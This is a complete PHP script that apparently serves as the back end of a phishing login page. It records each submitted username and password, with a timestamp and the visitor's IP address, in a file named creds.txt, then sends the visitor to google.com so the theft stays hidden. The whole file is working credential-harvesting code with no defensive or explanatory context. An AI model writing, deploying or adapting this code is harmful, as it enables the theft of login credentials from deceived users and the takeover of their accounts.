<?php
$file = fopen("creds.txt", "a");
$timestamp = date("Y-m-d H:i:s");
fwrite($file, "=== Login Attempt at $timestamp ===\n");
fwrite($file, "Username: " . $_POST['username'] . "\n");
fwrite($file, "Password: " . $_POST['password'] . "\n");
fwrite($file, "IP: " . $_SERVER['REMOTE_ADDR'] . "\n");
fwrite($file, "===============================\n\n");
fclose($file);
header("Location: https://www.google.com");
exit;
?>